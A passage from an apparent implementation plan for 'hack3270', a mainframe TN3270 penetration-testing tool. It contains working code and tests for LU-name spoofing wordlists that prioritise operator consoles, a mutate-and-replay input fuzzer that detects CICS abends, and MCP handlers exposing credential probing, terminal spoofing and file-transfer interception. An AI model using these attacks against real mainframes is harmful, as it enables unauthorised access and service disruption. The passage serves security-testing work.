    "# LU name spoofing wordlist — Phase 3 Task 9",
    "# Patterns from common VTAM/CICS naming conventions.",
    "# Harvest mode (LUSpoofer.harvested) grows this at runtime.",
    "",
    "# --- TN3270 server default pool (most common) ---",
]
lines += [f"TCP{i:05d}" for i in range(1, 100)]

lines += ["", "# --- Generic VTAM LU pool ---"]
lines += [f"LU{i:02d}" for i in range(1, 100)]

lines += ["", "# --- Terminal pool ---"]
lines += [f"TERM{i:04d}" for i in range(1, 51)]

lines += ["", "# --- CICS region terminals ---"]
for region in ("A", "B", "P", "T", "D", "Q"):
    lines += [f"CICS{region}{i:02d}" for i in range(1, 21)]

lines += ["", "# --- IMS terminals ---"]
lines += [f"IMS{i:02d}" for i in range(1, 21)]

lines += ["", "# --- TSO terminals ---"]
lines += [f"TSO{i:02d}" for i in range(1, 21)]

lines += ["", "# --- Operator consoles (HIGH VALUE — often privileged) ---"]
lines += ["CONSOLE", "MASTER", "SYSCONS", "OPERATOR"]
lines += [f"OPER{i:02d}" for i in range(1, 11)]
lines += [f"CONS{i:02d}" for i in range(1, 11)]

lines += ["", "# --- Printer LUs (sometimes no auth — preset terminal security) ---"]
lines += [f"PRT{i:02d}" for i in range(1, 11)]
lines += [f"PRINT{i:02d}" for i in range(1, 11)]

lines += ["", "# --- VTAM application LUs ---"]
lines += ["NETVIEW", "TPX", "CL/SUPERSESSION", "TELEVIEW"]
lines += [f"VTAM{i:02d}" for i in range(1, 11)]

lines += ["", "# --- Common single names ---"]
lines += ["ADMIN", "TEST", "GUEST", "DEMO", "DEFAULT", "PUBLIC"]

with open("injections/lu-names.txt", "w") as f:
    f.write("\n".join(lines) + "\n")

# Count non-comment, non-blank entries
real = [l for l in lines if l and not l.startswith("#")]
print(f"wrote {len(real)} LU name entries")
EOF
```

Expected: `wrote 5XX LU name entries` (~510)

- [ ] **Step 2: Verify wordlist loads**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python -c "
from hack3270_libs.attacks.negotiation import LUSpoofer
s = LUSpoofer()
s.load_wordlist('injections/lu-names.txt')
print(f'loaded {len(s.wordlist)} entries')
assert len(s.wordlist) > 400
assert 'TCP00001' in s.wordlist
assert 'CONSOLE' in s.wordlist
print('ok')
"
```

Expected: `loaded 5XX entries` / `ok`

- [ ] **Step 3: Commit**

```bash
git add injections/lu-names.txt
git commit -m "feat(wordlists): lu-names.txt — ~500 LU name spoofing candidates"
```

---

## Task 10: MCP tools — register all attack handlers

**Files:**
- Create: `hack3270_libs/mcp_tools.py`
- Create: `tests/test_mcp_tools.py`

One module that wires every attack into `ApiServer`. Each handler is a thin wrapper: parse args from line-protocol string → call attack method → JSON-encode result. Spec §3.2-§3.5 MCP sections.

- [ ] **Step 1: Write failing tests**

Create `tests/test_mcp_tools.py`:

```python
"""
MCP tool registration tests.

The MCP tools are thin wrappers — parse line-protocol args, call the
attack method, JSON-encode the result. We test the wiring (handler
registered? args parsed? result serialized?) not the attack logic
(that's covered by per-attack tests).
"""
import pytest
import json
from hackterm_core.api_server import ApiServer


@pytest.fixture
def api():
    """ApiServer with port=0 
```python
                            targets.append(EchoTarget(
                                step_idx=n, field_idx=f_idx,
                                source_step=m,
                                confidence=match_len / len(content),
                            ))

        targets.sort(key=lambda t: t.confidence, reverse=True)
        return targets

    @staticmethod
    def _longest_prefix_in(needle: bytes, haystack: bytes) -> int:
        """Length of the longest prefix of `needle` that appears as a
        substring in `haystack`."""
        for length in range(len(needle), 0, -1):
            if needle[:length] in haystack:
                return length
        return 0
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `19 passed` (11 record + 8 analyze)

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/state_fuzz.py tests/test_state_fuzz.py
git commit -m "feat(attacks): state fuzzer Phase 2 — echo-back analysis"
```

---

## Task 8: State fuzzer — mutate-replay driver

**Files:**
- Modify: `hack3270_libs/attacks/state_fuzz.py`
- Modify: `tests/test_state_fuzz.py`

Spec §3.5 Phase 3. Five mutations: `length_plus_1`, `length_double`, `type_confusion`, `extra_sba`, `step_swap`. Result classification: `ABEND` / `DISCONNECT` / `SCREEN_DIFFERS` / `IDENTICAL`.

**Note:** The replay driver itself (`fuzz_target()`) needs a live host — it calls `daemon.inject_to_server()` and waits for responses. Unit tests cover **mutation generation** and **result classification** (pure functions). The replay loop is integration-tested against DVCA.

- [ ] **Step 1: Write failing mutation + classification tests**

Append to `tests/test_state_fuzz.py`:

```python
# ===========================================================================
# Task 8: Mutate-replay
# ===========================================================================

# --- Mutation generation (pure functions — fully unit-testable) ---

def test_mutate_length_plus_1():
    """Original input + 1 byte. Tests EIBCALEN check."""
    from hack3270_libs.attacks.state_fuzz import mutate_input
    original = b"\x7d\x40\x40\x11\x40\xc1\xc1\xc2\xc3\xff\xef"  # ENTER + "ABC"
    out = mutate_input(original, "length_plus_1")
    # One byte longer than original (excluding IAC EOR which stays at end)
    assert len(out) == len(original) + 1
    assert out.endswith(b"\xff\xef")
    # Original data still present
    assert b"\xc1\xc2\xc3" in out


def test_mutate_length_double():
    from hack3270_libs.attacks.state_fuzz import mutate_input
    original = b"\x7d\x40\x40\x11\x40\xc1\xc1\xc2\xc3\xff\xef"
    out = mutate_input(original, "length_double")
    # Data portion doubled (3 bytes → 6 bytes)
    assert b"\xc1\xc2\xc3\xc1\xc2\xc3" in out
    assert out.endswith(b"\xff\xef")


def test_mutate_type_confusion_numeric_to_alpha():
    """All-numeric input (0xF0-0xF9) → replaced with alpha."""
    from hack3270_libs.attacks.state_fuzz import mutate_input
    # Input data is "123" = F1 F2 F3
    original = b"\x7d\x40\x40\x11\x40\xc1\xf1\xf2\xf3\xff\xef"
    out = mutate_input(original, "type_confusion")
    # Should NOT contain the original digits
    assert b"\xf1\xf2\xf3" not in out
    # Should contain alpha bytes instead (0xC1+ range)
    data = out[6:-2]  # strip header + IAC EOR
    assert all(0xC1 <= b <= 0xE9 for b in data)


def test_mutate_type_confusion_non_numeric_unchanged():
    """If input wasn't numeric, type_confusion is a no-op."""
    from hack3270_libs.attacks.state_fuzz import mutate_input
    original = b"\x7d\x40\x40\x11\x40\xc1\xc1\xc2\xc3\xff\xef"  # alpha
    out = mutate_input(original, "type_confusion")
    assert out == original


def test_mutate_extra_sba():
    """Append SBA + addr + data the original screen didn't have.
    Tests if host validates field count vs. screen layout."""
    from hack3270_libs.attacks.state_fuzz import mutate_input
    original = b"\x7d\x40\x40\x11\x40\xc1\xc1\xc2\xff\xef"
    out = mutate_input(original, "extra_sba")
    # Should have 2 SBA orders now (original + injected)
    assert out.count(0x11) >= 2
    assert out.endswith(b"\xff\xef")


def test_mutate_step_swap():
    """step_swap needs the OTHER step's input — pass it as kwarg."""
    from hack3270_libs.attacks.state_fuzz import mutate_input
    original = b"\x7d\x40\x40\x11\x40\xc1\xc1\xff\xef"
    other = b"\x7d\x40\x40\x11\x40\xc1\xe9\xe9\xe9\xff\xef"   # different data
    out = mutate_input(original, "step_swap", swap_with=other)
    assert out == other  # entire packet replaced


def test_mutate_unknown_raises():
    from hack3270_libs.attacks.state_fuzz import mutate_input
    with pytest.raises(ValueError):
        mutate_input(b"\x7d\xff\xef", "not_a_real_mutation")


# --- Result classification ---

def test_classify_identical():
    """Response matches recorded screen byte-for-byte → IDENTICAL."""
    from hack3270_libs.attacks.state_fuzz import classify_result
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    expected = p.parse(_screen("WELCOME BOB"))
    actual = _screen("WELCOME BOB")
    assert classify_result(actual, expected, p) == "IDENTICAL"


def test_classify_screen_differs():
    from hack3270_libs.attacks.state_fuzz import classify_result
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    expected = p.parse(_screen("WELCOME BOB"))
    actual = _screen("ERROR INVALID INPUT")
    assert classify_result(actual, expected, p) == "SCREEN_DIFFERS"


def test_classify_abend():
    """ABEND messages have known prefixes: DFHAC, ASRA, etc."""
    from hack3270_libs.attacks.state_fuzz import classify_result
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    expected = p.parse(_screen("WELCOME"))
    actual = _screen("DFHAC2206 TRANSACTION ABEND ASRA")
    assert classify_result(actual, expected, p) == "ABEND"


def test_classify_disconnect():
    """Empty response → host closed the connection."""
    from hack3270_libs.attacks.state_fuzz import classify_result
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    expected = p.parse(_screen("WELCOME"))
    assert classify_result(b"", expected, p) == "DISCONNECT"
    assert classify_result(None, expected, p) == "DISCONNECT"


def test_classify_abend_takes_priority():
    """Even if screen differs in other ways, ABEND wins."""
    from hack3270_libs.attacks.state_fuzz import classify_result
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    expected = p.parse(_screen("X"))
    actual = _screen("SOMETHING DIFFERENT DFHAC2206 ASRA")
    assert classify_result(actual, expected, p) == "ABEND"


# --- Fuzzy screen comparison (timestamps differ but it's the "same" screen) ---

def test_screens_match_fuzzy_ignores_field_content():
    """Two screens with same field STRUCTURE but different content
    are 'fuzzy equal' — needed because timestamps in fields change."""
    from hack3270_libs.attacks.state_fuzz import screens_match_fuzzy
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    # Same structure: 1 protected field, 1 unprotected, both same length
    a = p.parse(bytes([0xF5,0xC3, 0x1D,0x60, 0xC1,0xC2,0xC3, 0x1D,0x40, 0xF1,0xF2,0xF3, 0xFF,0xEF]))
    b = p.parse(bytes([0xF5,0xC3, 0x1D,0x60, 0xE7,0xE8,0xE9, 0x1D,0x40, 0xF7,0xF8,0xF9, 0xFF,0xEF]))
    assert screens_match_fuzzy(a, b) is True


def test_screens_match_fuzzy_rejects_different_structure():
    """Different field count → not fuzzy equal."""
    from hack3270_libs.attacks.state_fuzz import screens_match_fuzzy
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    a = p.parse(bytes([0xF5,0xC3, 0x1D,0x60, 0xC1, 0xFF,0xEF]))           # 1 field
    b = p.parse(bytes([0xF5,0xC3, 0x1D,0x60, 0xC1, 0x1D,0x40, 0xC2, 0xFF,0xEF]))  # 2 fields
    assert screens_match_fuzzy(a, b) is False
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v -k "mutate or classify or fuzzy"
```

Expected: failures with `ImportError: cannot import name 'mutate_input'`.

- [ ] **Step 3: Implement mutations + classification**

Append to `hack3270_libs/attacks/state_fuzz.py` (module-level functions, after the dataclasses, before `StateFuzzer` class — or at end of file):

```python
# ===========================================================================
# Mutation engine (Task 8) — pure functions, no daemon needed
# ===========================================================================

import re
from hack3270_libs.tn3270_v2 import IAC_EOR, ORD_SBA, encode_addr

Mutation = Literal["length_plus_1", "length_double", "type_confusion",
                   "extra_sba", "step_swap"]

# EBCDIC numeric range: F0-F9
_EBCDIC_DIGIT_LO, _EBCDIC_DIGIT_HI = 0xF0, 0xF9


def _split_inbound(pkt: bytes) -> tuple[bytes, bytes, bytes]:
    """Split an inbound packet into (header, data, trailer).
    header = AID + cursor(2) + first SBA + addr(2) — everything before field data
    data   = the EBCDIC field content
    trailer = IAC EOR
    Cheap heuristic: data is everything between the LAST SBA's addr bytes
    and IAC EOR. Works for single-field inputs (the common case)."""
    if pkt.endswith(IAC_EOR):
        body, trailer = pkt[:-2], IAC_EOR
    else:
        body, trailer = pkt, b""
    # Find last SBA — data starts 3 bytes after it (SBA + addr(2))
    last_sba = body.rfind(bytes([ORD_SBA]))
    if last_sba >= 0 and last_sba + 3 <= len(body):
        return body[:last_sba + 3], body[last_sba + 3:], trailer
    # No SBA — data is everything after AID + cursor(2)
    return body[:3], body[3:], trailer


def mutate_input(original: bytes, mutation: Mutation,
                 swap_with: Optional[bytes] = None) -> bytes:
    """Apply a mutation to a captured inbound packet.

    Mutations (spec §3.5 table):
      length_plus_1  — append 1 byte; tests EIBCALEN check
      length_double  — duplicate data; tests buffer overflow
      type_confusion — numeric → alpha; tests type validation
      extra_sba      — inject phantom field; tests field-count check
      step_swap      — replay other step's input here; tests state desync
    """
    if mutation == "step_swap":
        if swap_with is None:
            raise ValueError("step_swap requires swap_with=")
        return swap_with

    header, data, trailer = _split_inbound(original)

    if mutation == "length_plus_1":
        return header + data + b"\xc1" + trailer  # append EBCDIC 'A'

    elif mutation == "length_double":
        return header + data + data + trailer

    elif mutation == "type_confusion":
        if data and all(_EBCDIC_DIGIT_LO <= b <= _EBCDIC_DIGIT_HI for b in data):
            # Replace each digit with corresponding alpha (F1→C1, F2→C2, ...)
            alpha = bytes((b - 0xF0) + 0xC0 if b != 0xF0 else 0xC1 for b in data)
            return header + alpha + trailer
        return original  # not numeric — no-op

    elif mutation == "extra_sba":
        # Append a phantom SBA at addr 1900 (bottom of screen) with junk
        phantom = bytes([ORD_SBA]) + encode_addr(1900) + b"\xc8\xc1\xc3\xd2"  # "HACK"
        return header + data + phantom + trailer

    raise ValueError(f"unknown mutation: {mutation!r}")


# ===========================================================================
# Result classification (Task 8)
# ===========================================================================

ResultClass = Literal["ABEND", "DISCONNECT", "SCREEN_DIFFERS", "IDENTICAL"]

# CICS abend message patterns. DFHAC* = transaction abend, ASRA = 0C4 etc.
_ABEND_RE = re.compile(
    r"\b(DFHAC\d{4}|ASRA|ASRB|AICA|AEY9|AEXZ|ABEND|0C[1-9A-F])\b"
)


def classify_result(actual_raw: Optional[bytes], expected_screen: Screen,
                    protocol: Protocol) -> ResultClass:
    """Classify the host's response to a mutated input.

    Priority order: DISCONNECT > ABEND > IDENTICAL > SCREEN_DIFFERS.
    """
    if not actual_raw:
        return "DISCONNECT"

    actual_screen = protocol.parse(actual_raw)

    if _ABEND_RE.search(actual_screen.text):
        return "ABEND"

    if actual_screen.text == expected_screen.text:
        return "IDENTICAL"

    return "SCREEN_DIFFERS"


def screens_match_fuzzy(a: Screen, b: Screen) -> bool:
    """Are two screens structurally equivalent?

    'Fuzzy' = same field count, same protect/hidden/numeric flags per
    field, same field positions. Content IGNORED — timestamps and
    sequence numbers in field content cause false negatives otherwise.

    Used by the replay driver to verify each pre-target step landed
    on the expected screen before sending the next input.
    """
    if len(a.fields) != len(b.fields):
        return False
    for fa, fb in zip(a.fields, b.fields):
        if (fa.row, fa.col) != (fb.row, fb.col):
            return False
        if fa.protected != fb.protected:
            return False
        if fa.hidden != fb.hidden:
            return False
        if fa.numeric != fb.numeric:
            return False
    return True
```

- [ ] **Step 4: Add the replay driver method**

Append to `StateFuzzer` class in `hack3270_libs/attacks/state_fuzz.py`:

```python
    # --- Phase 3: Mutate & Replay (Task 8) ------------------------------
    # The replay loop needs a live host. This method is the orchestrator;
    # unit tests cover mutate_input() and classify_result() above.
    # Integration test: DVCA.

    def fuzz_target(self, daemon, flow_id: int, target: EchoTarget,
                    mutation: Mutation,
                    swap_step: Optional[int] = None,
                    timeout: float = 5.0) -> dict:
        """Drive a fresh session through a recorded flow, mutate at the
        target step, classify the result.

        Args:
          daemon:     ProxyDaemon — must be freshly connected
          flow_id:    which recorded flow to replay
          target:     which step to mutate at (from analyze())
          mutation:   which mutation to apply
          swap_step:  for step_swap mutation, which other step's input to use
          timeout:    seconds to wait for each host response

        Returns: {
          'mutation': str, 'target_step': int, 'classification': str,
          'response_text': str, 'diverged_at': int|None
        }
        """
        flow = self.load_flow(flow_id)

        # 1. Replay verbatim up to target.source_step
        for idx in range(target.source_step):
            step = flow.steps[idx]
            if not step.user_input:
                continue
            daemon.inject_to_server(step.user_input)
            response = self._wait_for_response(daemon, timeout)
            if response is None:
                return {"mutation": mutation, "target_step": target.source_step,
                        "classification": "DISCONNECT", "response_text": "",
                        "diverged_at": idx}
            # Verify we're still on track (fuzzy compare)
            if idx + 1 < len(flow.steps):
                expected = flow.steps[idx + 1].host_screen
                actual = self.protocol.parse(response)
                if not screens_match_fuzzy(actual, expected):
                    return {"mutation": mutation, "target_step": target.source_step,
                            "classification": "SCREEN_DIFFERS", "response_text": actual.text,
                            "diverged_at": idx}

        # 2. At target step: send mutated input
        original_input = flow.steps[target.source_step].user_input
        swap_with = (flow.steps[swap_step].user_input
                     if swap_step is not None else None)
        mutated = mutate_input(original_input, mutation, swap_with=swap_with)
        daemon.inject_to_server(mutated)

        # 3. Capture response, classify
        response = self._wait_for_response(daemon, timeout)
        expected_next = (flow.steps[target.source_step + 1].host_screen
                         if target.source_step + 1 < len(flow.steps)
                         else Screen.empty())
        cls = classify_result(response, expected_next, self.protocol)

        return {
            "mutation": mutation,
            "target_step": target.source_step,
            "classification": cls,
            "response_text": (self.protocol.parse(response).text
                              if response else ""),
            "diverged_at": None,
        }

    @staticmethod
    def _wait_for_response(daemon, timeout: float) -> Optional[bytes]:
        """Pump daemon.tick() until s2c traffic arrives or timeout.
        Returns the raw bytes or None on timeout/disconnect.

        This is a SIMPLE polling loop — adequate for fuzzing where
        we control timing. Not for production traffic forwarding."""
        captured = []
        def grab(data, direction):
            if direction == "s2c":
                captured.append(data)
        daemon.add_observer(grab)
        try:
            deadline = time.time() + timeout
            while time.time() < deadline:
                daemon.tick()
                if captured:
                    return captured[0]
                time.sleep(0.01)
            return None
        finally:
            # Best-effort observer removal — ProxyDaemon doesn't expose
            # remove_observer() yet. Acceptable for fuzzing (we reconnect
            # between runs anyway).
            if grab in daemon._observers:
                daemon._observers.remove(grab)
```

- [ ] **Step 5: Run all state_fuzz tests**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `33 passed` (11 record + 8 analyze + 14 mutate/classify/fuzzy)

- [ ] **Step 6: Commit**

```bash
git add hack3270_libs/attacks/state_fuzz.py tests/test_state_fuzz.py
git commit -m "feat(attacks): state fuzzer Phase 3 — mutations + classify + replay driver"
```

---

## Task 9: lu-names.txt wordlist

**Files:**
- Create: `injections/lu-names.txt`

Spec §3.2: ~500 seed entries. Patterns observed in the wild: `TCP00001-99` (TN3270E default LU pool naming), `LU01-99`, `CICSA01+`, `TERM0001+`, region-specific patterns. Harvest mode (Task 3) grows it.

- [ ] **Step 1: Generate the wordlist**

Create `injections/lu-names.txt`:

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python > injections/lu-names.txt << 'EOF'
# LU-name spoofing wordlist for hack3270.
# These are LU (Logical Unit) names — VTAM resource identifiers.
# Observed patterns from real engagements + IBM doc defaults.
# Harvest mode (LUSpoofer.mode='harvest') appends discovered names here.
#
# Format: one name per line. # = comment, blank lines ignored.
# Names are ASCII (telnet layer, NOT EBCDIC). Max 8 chars (VTAM limit).

# --- TN3270E default pool naming (most common) ---
# z/OS Comm Server creates these by default: TCPxxxxx
print("\n".join(f"TCP{i:05d}" for i in range(1, 100)))

# --- Generic LU pool ---
print("\n".join(f"LU{i:02d}" for i in range(1, 100)))
print("\n".join(f"LU{i:03d}" for i in range(1, 100)))

# --- CICS region terminals (region letter + sequence) ---
for region in "ABCDEFGH":
    print("\n".join(f"CICS{region}{i:02d}" for i in range(1, 21)))

# --- TERM* pattern (older VTAM defs) ---
print("\n".join(f"TERM{i:04d}" for i in range(1, 51)))

# --- TSO terminals ---
print("\n".join(f"TSO{i:05d}" for i in range(1, 21)))
print("\n".join(f"TSOTRM{i:02d}" for i in range(1, 21)))

# --- Printer LUs (sometimes worth trying — different ACL) ---
print("\n".join(f"PRT{i:05d}" for i in range(1, 11)))
print("\n".join(f"PRINT{i:03d}" for i in range(1, 11)))

# --- Console / system terminals (high value if they work) ---
for name in ["CONSOLE", "MASTER", "SYSCONS", "OPER01", "OPER02",
             "ADMIN01", "ADMIN02", "SYSPROG", "SYSADMIN"]:
    print(name)

# --- IBM-supplied sample names (from VTAM samples in SYS1.SAMPLIB) ---
for name in ["A01TSO", "A01CICS", "A01IMS", "A01DB2",
             "NETA01", "NETA02", "NETA03",
             "SC0TCP01", "SC0TCP02", "SC0TCP03"]:
    print(name)

# --- Region-mnemonic patterns (PROD/TEST/DEV) ---
for env in ["PROD", "TEST", "DEV", "QA", "UAT"]:
    for i in range(1, 11):
        print(f"{env}{i:02d}")
        print(f"{env}TR{i:02d}")
EOF
```

- [ ] **Step 2: Verify file size and format**

```bash
cd /home/kali/hack3270-update && wc -l injections/lu-names.txt && head -20 injections/lu-names.txt && tail -10 injections/lu-names.txt
```

Expected: ~580 lines (varies with comment lines), entries like `TCP00001`, `LU01`, `CICSA01`, `CONSOLE`.

- [ ] **Step 3: Verify it loads through LUSpoofer**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python -c "
from hack3270_libs.attacks.negotiation import LUSpoofer
s = LUSpoofer()
s.load_wordlist('injections/lu-names.txt')
print(f'loaded {len(s.wordlist)} LU names')
print('first 3:', s.wordlist[:3])
print('last 3:', s.wordlist[-3:])
assert len(s.wordlist) > 400, 'too few entries'
assert all(len(n) <= 8 for n in s.wordlist), 'VTAM names are max 8 chars'
print('OK')
"
```

Expected: `loaded 5xx LU names`, no assertion error.

- [ ] **Step 4: Commit**

```bash
git add injections/lu-names.txt
git commit -m "feat(wordlists): seed lu-names.txt with ~500 common VTAM LU patterns"
```

---

## Task 10: MCP tool registration

**Files:**
- Create: `hack3270_libs/mcp_tools.py`
- Create: `tests/test_mcp_tools.py`

Wires all five attacks into `ApiServer` (Phase 0). The API server is a line-based TCP protocol on `:31337` — `register(cmd, handler)` where `handler(args_str) -> response_str`. Spec §3.2/§3.3/§3.4/§3.5 list the MCP tools per attack.

**Tool table** (collected from spec):

| Command | Args | Returns | Backed by |
|---|---|---|---|
| `esm_get_findings` | — | JSON dict | `ESMFingerprinter.findings` |
| `esm_active_probe` | `<user> <pass>` | JSON dict | `ESMFingerprinter.active_probe()` |
| `lu_spoof_single` | `<name>` | `OK` | `LUSpoofer.set_target()` |
| `lu_spoof_next` | — | `<name>` or `DONE` | `LUSpoofer.next_lu()` |
| `lu_get_harvested` | — | JSON list | `LUSpoofer.harvested` |
| `lu_get_results` | — | JSON list | `LUSpoofer.results` |
| `qr_arm` | `<json-lies>` | `OK` | `QueryReplyLiar.arm()` |
| `qr_disarm` | — | `OK` | `QueryReplyLiar.disarm()` |
| `indfile_set_mode` | `<mode>` | `OK` | `IndFileInterceptor.mode` |
| `indfile_get_captures` | — | JSON list | `IndFileInterceptor.captures` |
| `flow_record_start` | `<name>` | `OK` | `StateFuzzer.start_recording()` |
| `flow_record_stop` | — | `<flow_id>` | `StateFuzzer.stop_recording()` |
| `flow_analyze` | `<flow_id>` | JSON list | `StateFuzzer.analyze()` |
| `flow_list_mutations` | — | JSON list | static |

- [ ] **Step 1: Write failing tests**

Create `tests/test_mcp_tools.py`:

```python
"""
MCP tool registration tests.

The actual ApiServer is socket-based (tested in Phase 0). Here we test
that handlers are REGISTERED correctly and produce well-formed responses
when called directly.
"""
import json
import pytest
from hackterm_core.api_server import ApiServer


@pytest.fixture
def attacks(tmp_path, fake_daemon):
    """Build all five attack objects, pre-attached to a FakeDaemon."""
    import sqlite3
    from hack3270_libs.tn3270_v2 import TN3270
    from hack3270_libs.attacks.esm_passive import ESMFingerprinter
    from hack3270_libs.attacks.negotiation import LUSpoofer
    from hack3270_libs.attacks.structured import QueryReplyLiar, IndFileInterceptor
    from hack3270_libs.attacks.state_fuzz import StateFuzzer

    proto = TN3270()
    db = sqlite3.connect(str(tmp_path / "mcp.db"))

    a = {
        "esm": ESMFingerprinter(proto),
        "lu": LUSpoofer(proto),
        "qr": QueryReplyLiar(),
        "indfile": IndFileInterceptor(capture_dir=str(tmp_path)),
        "fuzzer": StateFuzzer(proto, db),
    }
    for v in a.values():
        v.attach(fake_daemon)
    return a


@pytest.fixture
def api(attacks):
    from hack3270_libs.mcp_tools import register_all
    server = ApiServer(port=0)   # port 0 = don't bind, just registry
    register_all(server, attacks)
    return server


def test_register_all_registers_expected_commands(api):
    expected = {
        "esm_get_findings", "esm_active_probe",
        "lu_spoof_single", "lu_spoof_next", "lu_get_harvested", "lu_get_results",
        "qr_arm", "qr_disarm",
        "indfile_set_mode", "indfile_get_captures",
        "flow_record_start", "flow_record_stop", "flow_analyze",
        "flow_list_mutations",
    }
    assert expected.issubset(set(api._handlers.keys()))


# --- ESM ---

def test_esm_get_findings_empty(api):
    resp = api._handlers["esm_get_findings"]("")
    assert json.loads(resp) == {}


def test_esm_get_findings_with_data(api, attacks, fake_daemon):
    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    pkt = bytes([0xF5,0xC3,0x1D,0x40]) + codec.to_ebcdic("DFHCE3530 invalid") + b"\xff\xef"
    fake_daemon.fire_s2c(pkt)
    resp = api._handlers["esm_get_findings"]("")
    findings = json.loads(resp)
    assert "username_enum" in findings


# --- LU spoofing ---

def test_lu_spoof_single(api, attacks, fake_daemon):
    resp = api._handlers["lu_spoof_single"]("CICSA01")
    assert resp == "OK"
    assert fake_daemon.negotiate_opts.spoof_device_name == "CICSA01"


def test_lu_spoof_single_no_arg(api):
    resp = api._handlers["lu_spoof_single"]("")
    assert resp.startswith("ERROR")


def test_lu_get_harvested(api, attacks):
    attacks["lu"].harvested.add("TERM0099")
    resp = api._handlers["lu_get_harvested"]("")
    assert "TERM0099" in json.loads(resp)


def test_lu_get_results(api, attacks):
    attacks["lu"].record_result("CICSA01", "MAIN MENU")
    resp = api._handlers["lu_get_results"]("")
    data = json.loads(resp)
    assert ["CICSA01", "MAIN MENU"] in data


# --- Query Reply ---

def test_qr_arm(api, attacks):
    resp = api._handlers["qr_arm"]('{"alt_rows": 62, "deny_color": true}')
    assert resp == "OK"
    assert attacks["qr"].armed is True
    assert attacks["qr"].lies.alt_rows == 62
    assert attacks["qr"].lies.deny_color is True


def test_qr_arm_bad_json(api):
    resp = api._handlers["qr_arm"]("not json")
    assert resp.startswith("ERROR")


def test_qr_disarm(api, attacks):
    attacks["qr"].armed = True
    resp = api._handlers["qr_disarm"]("")
    assert resp == "OK"
    assert attacks["qr"].armed is False


# --- IND$FILE ---

def test_indfile_set_mode(api, attacks):
    resp = api._handlers["indfile_set_mode"]("carbon_copy")
    assert resp == "OK"
    assert attacks["indfile"].mode == "carbon_copy"


def test_indfile_set_mode_invalid(api):
    resp = api._handlers["indfile_set_mode"]("not_a_mode")
    assert resp.startswith("ERROR")


def test_indfile_get_captures(api, attacks):
    attacks["indfile"].captures.append({"size": 42, "direction": "GET"})
    resp = api._handlers["indfile_get_captures"]("")
    data = json.loads(resp)
    assert data[0]["size"] == 42


# --- State fuzzer ---

def test_flow_record_start(api, attacks):
    resp = api._handlers["flow_record_start"]("login_test")
    assert resp == "OK"
    assert attacks["fuzzer"].recording is True


def test_flow_record_stop_returns_id(api, attacks, fake_daemon):
    api._handlers["flow_record_start"]("test")
    # Need at least one step before stop
    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    pkt = bytes([0xF5,0xC3,0x1D,0x40]) + codec.to_ebcdic("HELLO") + b"\xff\xef"
    fake_daemon.fire_s2c(pkt)
    resp = api._handlers["flow_record_stop"]("")
    assert resp.isdigit()
    assert int(resp) > 0


def test_flow_analyze(api, attacks, fake_daemon):
    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    api._handlers["flow_record_start"]("echo")
    fake_daemon.fire_s2c(bytes([0xF5,0xC3,0x1D,0x40]) + codec.to_ebcdic("ENTER") + b"\xff\xef")
    fake_daemon.fire_c2s(b"\x7d\x40\x40\x11\x40\xc1" + codec.to_ebcdic("FOOBAR") + b"\xff\xef")
    fake_daemon.fire_s2c(bytes([0xF5,0xC3,0x1D,0x40]) + codec.to_ebcdic("FOOBAR") + b"\xff\xef")
    flow_id = api._handlers["flow_record_stop"]("")
    resp = api._handlers["flow_analyze"](flow_id)
    targets = json.loads(resp)
    assert len(targets) >= 1
    assert targets[0]["step_idx"] == 1


def test_flow_list_mutations(api):
    resp = api._handlers["flow_list_mutations"]("")
    muts = json.loads(resp)
    assert "length_plus_1" in muts
    assert "step_swap" in muts
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_mcp_tools.py -v
```

Expected: `ModuleNotFoundError: No module named 'hack3270_libs.mcp_tools'`

- [ ] **Step 3: Implement mcp_tools.py**

Create `hack3270_libs/mcp_tools.py`:

```python
"""
MCP tool registration for Phase 3 attacks.

Wires all five attack modules into hackterm_core.ApiServer.
The API is line-based TCP on :31337 — each handler takes a string
arg and returns a string response. JSON for structured data.

Spec §3.2-§3.5 list per-attack tool signatures. This module collects
them in one place so the GUI/CLI just calls register_all() once.

MCP-first principle (spec §5 Phase 3 note): test attacks via these
handlers BEFORE building GUI tabs.
"""
import json
from dataclasses import asdict

from hackterm_core.protocol import QueryLies


_VALID_INDFILE_MODES = {"carbon_copy", "inject", "alert"}
_MUTATIONS = ["length_plus_1", "length_double", "type_confusion",
              "extra_sba", "step_swap"]


def register_all(api_server, attacks: dict) -> None:
    """Register all Phase 3 attack handlers on the ApiServer.

    Args:
      api_server: hackterm_core.ApiServer instance
      attacks: dict with keys 'esm', 'lu', 'qr', 'indfile', 'fuzzer'
               (the five attack objects, already attached to daemon)
    """
    esm = attacks["esm"]
    lu = attacks["lu"]
    qr = attacks["qr"]
    indfile = attacks["indfile"]
    fuzzer = attacks["fuzzer"]

    # --- ESM passive fingerprinter ---

    def esm_get_findings(_args: str) -> str:
        return json.dumps(esm.findings)

    def esm_active_probe(args: str) -> str:
        parts = args.split()
        if len(parts) < 2:
            return "ERROR: usage: esm_active_probe <user> <password>"
        if not esm.active_enabled:
